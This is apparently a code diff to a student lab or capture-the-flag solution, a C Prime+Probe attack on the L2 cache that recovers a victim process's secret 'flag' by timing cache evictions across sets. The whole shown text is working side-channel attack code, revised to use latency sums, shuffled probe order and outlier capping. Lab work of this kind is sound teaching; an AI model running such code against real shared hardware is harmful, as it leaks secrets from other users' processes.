@@ -38,59 +38,50 @@ int main()
     // TODO: Implement your attack here
     // Target L2
 
-    // per-set "slow" score across many rounds
-    // a slow probe means the victim evicted us from that set => it uses it
-    long score[NSESTS] = {0};
-
+    // fixed random probe order, built once so rand() stays out of the hot
+    // loop and the prefetcher can't predict our access pattern
     srand(time(NULL) ^ getpid());
+    int order[NWAYS];
+    for (int k = 0; k < NWAYS; k++)
+        order[k] = k;
+    for (int k = NWAYS - 1; k > 0; k--)
+    {
+        int j = rand() % (k + 1);
+        int t = order[k];
+        order[k] = order[j];
+        order[j] = t;
+    }
+
+    // sum probe latency per L2 set over many rounds; the victim keeps one set
+    // (= flag) evicted, so it reads slowest. compare sets to each other.
+    long score[NSESTS] = {0};
 
     for (int r = 0; r < ROUNDS; r++)
     {
         for (int s = 0; s < NSESTS; s++)
         {
-            // NWAYS lines that all map to L2 set s
-            // same set bits (s << 6), different tag (k << 16)
-            ADDR_PTR addr[NWAYS];
+            // lines for set s: same set bits (s << 6), different tag (k << 16)
+            ADDR_PTR base = (ADDR_PTR)buf + ((ADDR_PTR)s << 6);
+
+            // prime: fill set s with our own lines (plain loads, low footprint)
             for (int k = 0; k < NWAYS; k++)
-                addr[k] = (ADDR_PTR)buf + ((ADDR_PTR)s << 6) + ((ADDR_PTR)k << 16);
+                *(volatile char *)(base + ((ADDR_PTR)order[k] << 16));
 
-            // shuffle so the prefetcher can't predict our accesses
-            // fisher yates shuffle
-            for (int k = NWAYS - 1; k > 0; k--)
-            {
-                int j = rand() % (k + 1);
-                ADDR_PTR t = addr[k];
-                addr[k] = addr[j];
-                addr[j] = t;
-            }
-
-            // prime: fill the set with our own lines
-            for (int k = 0; k < NWAYS; k++)
-                measure_one_block_access_time(addr[k]);
-
-            // wait for the victim to run
             wait(WAITCYCLES);
 
-            // reshuffle before probing
-            for (int k = NWAYS - 1; k > 0; k--)
-            {
-                int j = rand() % (k + 1);
-                ADDR_PTR t = addr[k];
-                addr[k] = addr[j];
-                addr[j] = t;
-            }
-
-            // probe: a slow line was evicted by the victim
+            // probe: the more the victim evicted us, the slower this reads
             for (int k = 0; k < NWAYS; k++)
             {
-                CYCLES t = measure_one_block_access_time(addr[k]);
-                if (t > THRESHOLD)
-                    score[s]++;
+                CYCLES t = measure_one_block_access_time(
+                    base + ((ADDR_PTR)order[k] << 16));
+                if (t > THRESHOLD * 4) // cap interrupt/outlier spikes
+                    t = THRESHOLD * 4;
+                score[s] += t;
             }
         }
     }
 
-    // the most-evicted set is the flag
+    // the slowest set is the one the victim keeps touching
     long best = -1;
     for (int s = 0; s < NSESTS; s++)
         if (score[s] > best)
